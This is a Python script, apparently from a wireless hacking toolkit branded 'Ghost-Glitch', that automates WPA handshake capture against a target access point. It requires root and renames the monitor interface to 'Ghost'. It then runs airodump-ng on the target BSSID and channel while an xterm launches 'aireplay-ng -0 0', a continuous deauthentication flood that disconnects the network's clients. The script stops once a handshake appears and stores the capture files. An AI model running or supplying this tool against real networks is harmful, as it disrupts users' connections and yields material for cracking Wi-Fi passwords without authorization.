#!/usr/bin/python
# -*- coding: UTF-8 -*-

# python scripts/C_captureHandshake.py wlan0mon C2:94:AD:CC:FC:60 52
# iBrokenShadow 
# Made by Broken Shadow

import psutil
import subprocess
import time
import csv
import pandas as pd
import os
import shutil
import sys
import signal
import threading
from X_requirement import check_installation
requirements_satisfied = check_installation()

# Console colors
W = '\033[37m'          # white (normal)
GR = '\033[32m'         # white (normal)
R = '\033[31m'          # red
G = '\033[32m'          # green
O = '\033[38;5;208m'    # orange
Y = '\033[33m'          # Yellow
B = '\033[34m'          # blue
P = '\033[35m'          # purple
C = '\033[36m'          # cyan


# Getting Version of File
try:
    pathOFScript = os.path.abspath(os.path.dirname(__file__))
    pathOFScript = pathOFScript[:-5]
    versionFile = pathOFScript + ".version"
    with open(versionFile, "r") as file:
        versionOfScript = file.read()
except: 
    versionOfScript = "--"
    pass


def bann_text():
    # clear()
    logo = """ 
░██████╗░██╗░░██╗░█████╗░░██████╗████████╗░░░░░░░██████╗░██╗░░░░░██╗████████╗░█████╗░██╗░░██╗
██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝░░░░░░██╔════╝░██║░░░░░██║╚══██╔══╝██╔══██╗██║░░██║
██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░█████╗██║░░██╗░██║░░░░░██║░░░██║░░░██║░░╚═╝███████║
██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░╚════╝██║░░╚██╗██║░░░░░██║░░░██║░░░██║░░██╗██╔══██║
╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░░░░░░░╚██████╔╝███████╗██║░░░██║░░░╚█████╔╝██║░░██║
░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░░░░░╚═════╝░╚══════╝╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
    """
    print(R + logo + G)
    print(R+ f"\t\t\t\t\t\t\t\t- by iBrokenShadow ({versionOfScript})\n\n\n" + G)
    
def ReportError():
    header = "\n\n\n\n\t-------------------------------------------------------------"
    header2 = "\t-------------------------------------------------------------"
    MainHeader = "\tREPORT ANY ERROR FOR FIXES (Thanks for your Contribution)"
    mainMessage = """
        Given Contacts : Telegram  : https://t.me/iBrokenShadow
                       : Instagram : https://www.instagram.com/iBrokenShadow/
                       : Github    : https://github.com/iBrokenShadow
    """
    Terrr2 = "\tThanks! visit https://ibrokenshadow.com"
    
    print(C + header + W)
    
    print(R + MainHeader + W)
    print(W + mainMessage + W)
    print(G + Terrr2 + W)
    
    print(C + header2 + W)


    
def run(cmd):
    subprocess.run(cmd)

# REQUIREMENTS
def requirements():
    try:
        if requirements_satisfied == False:
            clear() ; print(R) ; run(["figlet", "ERROR !!!"])
            print("\n\nMake Sure to Satisfy all Requirement First...")
            print(GR) ; input() ; sys.exit(0)
    except KeyboardInterrupt: sys.exit(0)
    except: sys.exit(0)
    
    

subprocess.run("clear")

def is_run_with_sudo():
    return os.geteuid() == 0

if is_run_with_sudo() == False:
    print("ERROR!!!\n\nPlease run with sudo privileges...\n\n")
    print("\n") ; input("Press Any Key to quit...")
    sys.exit()

# Variables Passed from 1st Program
try:
    INTERFACE = sys.argv[1]
    BSSID = sys.argv[2]
    CHANNEL = sys.argv[3]
    PythonFilepath = sys.argv[4]
except:
    print("SYNTAX ERROR!!!\n\nexample:\n\tpython -u \"scriptName.py\" 'interface-name' 'BSSID' 'CHANNEL' \"PATH TO ghostglitch.py File\"")
    print("\n") ; 
    try: input("Press Any Key to quit...")
    except KeyboardInterrupt: sys.exit(0)
    sys.exit(0)

def exit_pause():
    print("\n") ; input("Press Any Key to quit...") ; clear() #; exit()
    subprocess.run("python captureHandshake.py")

def Del_Current_Line():
    sys.stdout.write("\r\033[K")
    sys.stdout.flush()

def Del_Pre_Line():
    print("\033[F\033[K", end="", flush=True)

# CLEAR SCREEN
def clear():
    subprocess.run("clear")




# SIMPLE ANIMATION
def loading_animation(text):
    chars = "/—\|"  # Characters for the animation
    start_time = time.time()
    while time.time() - start_time < 2:
        for char in chars:
            sys.stdout.write('\r' + text + char)
            sys.stdout.flush()
            time.sleep(0.1)
            
# Slowly Type something instead of sudden print   
def SlowType(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)
    print()  # Print a newline after printing the sentence slowly

  
  
# Fastly Type something instead of sudden print   
def FastType(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.005)
    print()  # Print a newline after printing the sentence slowly


# Check if Monitor Mode is already Enabled
def is_monitor_mode_enabled(interface):
    try:
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            return True
        else:
            return False
    except subprocess.CalledProcessError as e:
        print(f"Error checking monitor mode for {interface}: {e}")
        return False


# # MONITOR MODE DISABLE
# def disable_monitor_mode(interface):
#     x =0
    
# # USER RESPONSE ON DISBALING MONITOR MODE
# def DoIdisable(interface):
#     try:
#         user_input = input("(( Disable Monitor Mode? (y/n) ))  ") ; Del_Pre_Line()
#         if len(user_input) != 1:
#             print("ERROR! Input must be a single character...")
#             exit_pause()
            
#         # Process the input here
#         if user_input.lower() == 'y':
#             # IF MONITOR MORE IS ALREADY DISABLED THERE
#             monitor_mode_enabled = is_monitor_mode_enabled(interface)
#             if monitor_mode_enabled == False:
#                 loading_animation("Wait... ") ; Del_Current_Line()
#                 print(f"Monitor Mode is already Disabled on interface : {interface}\n")
                
#                 time.sleep(1) ; print("-----" *5)
#                 subprocess.run(["iwconfig", interface])
#                 print("-----" *5) ; exit_pause()
#             else:
#                 disable_monitor_mode(interface)
            
#     except ValueError as e:
#         print("Error:", e)
#         exit_pause()
    


#------------------------------------------------------------------------------------------------------
# global rest
# # Function to handle KeyboardInterrupt
# def handle_interrupt(signum, frame):
#     # Terminate command 2
#     print("Ctrl+C detected. Terminating processes...")
#     proc2.terminate()

    


# IGNORE
def backToMain():
    a = 1

def MonitorModeDisbaled_RedirectProgramA(monitorModeFile):
    check = is_monitor_mode_enabled(INTERFACE)
    if check == False:
        clear() ; print(f"MONITOR MODE IS DISBALED ON '{INTERFACE}'\n.\n.\n.\n")
        loading_animation("Wait... Turning On Monitor Mode") ; Del_Current_Line() ; clear()

        subprocess.run(['sudo', 'python', monitorModeFile])
        sys.exit()
        
        
# Get Connected Client's BSSIDs for Deauthentication attack on each clients that get connected        
def get_connected_clients_from_csv(csv_file):
    with open(csv_file, 'r') as file:
        # Skip first 4 lines
        for _ in range(5):
            next(file)
        # Extract client BSSIDs from the first column
        connected_clients = [line.split(',')[0].strip() for line in file]
    return connected_clients



def CountCSVLines(CapturedCSV_File):
    try:
        with open(CapturedCSV_File, "r") as file:
            line_count = sum(1 for _ in file)
            return line_count
    except:
        subprocess.run("clear")
        print("ERROR! File Not Found...") ; sys.exit(0)



# MOVE ALL FILES TO PATH
def moveFilestoPath(files):
    try:
        for file in files:
            shutil.move(file, path)
            
    except KeyboardInterrupt: 
        sys.exit(0)
        
        
        
# Change Interface Name to Ghost        
def change_interface_name(current_name, new_name):
    def get_next_interface_name(base_name):
        i = 1
        while True:
            if current_name.endswith("mon"):
                interface_name = f"{base_name}{i}mon"
            else: interface_name = f"{base_name}{i}"
            
            if not check_interface_exists(interface_name):
                return interface_name
            i += 1

    def check_interface_exists(interface_name):
        try:
            subprocess.check_output(['ip', 'link', 'show', interface_name])
            return True
        except subprocess.CalledProcessError:
            return False

    def rename_interface(current_name, new_name):
        try:
            subprocess.run(['ip', 'link', 'set', current_name, 'down'])
            subprocess.run(['ip', 'link', 'set', current_name, 'name', new_name])
            subprocess.run(['ip', 'link', 'set', new_name, 'up'])
        except Exception as e:
            print(f"\n\n\n\nERROR 128: {e}")
            time.sleep(0.2) ; ReportError() ; sys.exit(1)

    try:
        next_name = get_next_interface_name(new_name)
        rename_interface(current_name, next_name)
        return next_name
    except Exception as e:
        print(f"\n\n\n\nERROR 169: {e}")
        time.sleep(0.2) ; ReportError() ; sys.exit(1)
        
        

#----------------------------------------------------------------------
                            # POST DEMON
#----------------------------------------------------------------------
def PostDemon():
    try:
        subprocess.run("clear")
        print(output_lines)
        lines = (CountCSVLines(CAPfileName+"-01.csv")) + 6 ; i = 0
        
        # CHECK IF HANDSHAKE ACTUALLY CAPTURED OR NOT
        if retVAL == True:
            while i<lines: 
                print("\n") ; i+=1
            print(" HANDSHAKE CAPTURED")
            print(f"\n Captured Files are stored in : \n \"{path}\"\n\n Press Enter to Close...\n\n")
            
        if retVAL == False:
            print("\n\n ERROR! HANDSHAKE NOT CAPTURED...\n Try Again...\n\n")
            print(f" Captured Files are stored in : \n \"{path}\"")
        
        
    except KeyboardInterrupt:
        print("\n\n") ; time.sleep(0.2) ; ReportError() ; sys.exit(1)
    except Exception as e: 
        print(f"ERROR: {e}")
        time.sleep(0.2) ; ReportError() ; sys.exit(1)

########################################## --END--  ###################################################







#######################################################################################################
#                                           MAIN FUNCTION                                             #
#######################################################################################################

try:
    RES = 0 ; requirements()
    # PythonFilepath = os.path.abspath(os.path.dirname(__file__)) + "/"
    current_directory = os.getcwd() + "/"
    MonitorModeDisbaled_RedirectProgramA(PythonFilepath + "ghost-glitch.py")

    CSVfilePath = PythonFilepath + "airodumped_BS_list-01.csv"
    path = PythonFilepath + "CaptureHandshake_BS" + "/"
    CAPfileName = path + "CaptureHandshakke_BS_list"
    
    files = [current_directory+"CaptureHandshakke_BS_list-01.csv", current_directory+"CaptureHandshakke_BS_list-01.cap", current_directory+"CaptureHandshakke_BS_list-01.log.csv", current_directory+"CaptureHandshakke_BS_list-01.kismet.csv", current_directory+"CaptureHandshakke_BS_list-01.kismet.netxml"]
    filesH = [CAPfileName+"-01.csv", CAPfileName+"-01.cap", CAPfileName+"-01.log.csv", CAPfileName+"-01.kismet.csv", CAPfileName+"-01.kismet.netxml"]
    
    # Remove All files Necessary and Create the Folder to place all files
    try:
        for file in files: os.remove(file)
    except: pass
    try:
        for fileh in filesH: os.remove(fileh)
    except: pass
    
    try: os.remove(path)
    except: pass
    try: os.makedirs(path)
    except: pass
    subprocess.run("clear")
    
    # CAPTURE COMMAND STARTS    
    global retVAL ; retVAL = False
    
                
                
#----------------------------------------------------------------------
#                               DEMON
#----------------------------------------------------------------------
    Old_INTERFACE_NAME = INTERFACE
    AbraKaDabra = change_interface_name(INTERFACE, "Ghost")   # Name Changed with suffix Ghost
    INTERFACE = AbraKaDabra ; clear()
    


    # # Command 1: Run airodump-ng in the current terminal
    # print(["airodump-ng", INTERFACE, "--bssid", BSSID, "--channel", CHANNEL, "--write", "CaptureHandshakke_BS_list", '--write-interval', '1', '--ignore-negative-one']) ; input()
    proc1 = subprocess.Popen(["airodump-ng", INTERFACE, "--bssid", BSSID, "--channel", CHANNEL, "--write", "CaptureHandshakke_BS_list", '--write-interval', '1', '--ignore-negative-one'], stdout=subprocess.PIPE, text=True) ##### , '--write-interval', '1', '--ignore-negative-one'
    RES = 1                     
                                                                                                                    
    
    time.sleep(1)
    # Command 2: Run aireplay-ng in a new xterm window
    aireplay_command = [
        "xterm",
        "-e",
        f"aireplay-ng -0 0 -a {BSSID} {INTERFACE}"
    ]
    proc2 = subprocess.Popen(aireplay_command)


    output_lines = ""
    # Monitor output of command 1
    while True:
        line = proc1.stdout.readline().strip()
        output_lines += line + "\n"
        
        print(line)  # Print the output of command 1
        if "handshake" in line.lower():  # Check if the word "handshake" is in the line
            proc2.kill() ; proc1.kill()
            retVAL = True
            break
    

    proc2.kill() ; proc1.kill()
    subprocess.run("clear")
    if RES==1: 
        moveFilestoPath(files)
        PostDemon() ; time.sleep(0.2) ; ReportError() ; sys.exit(1)
    sys.exit(0)

#--------------------END-----------------------



except KeyboardInterrupt:
    #subprocess.run("clear")
    if RES==1: 
        moveFilestoPath(files)
        PostDemon()
        
    proc2.kill() ; proc1.kill()
    time.sleep(0.2) ; ReportError() ; sys.exit()
    
except Exception as e:
    proc2.kill() ; proc1.kill()
    subprocess.run("clear")
    print(f"ERROR: {e}") ; input()
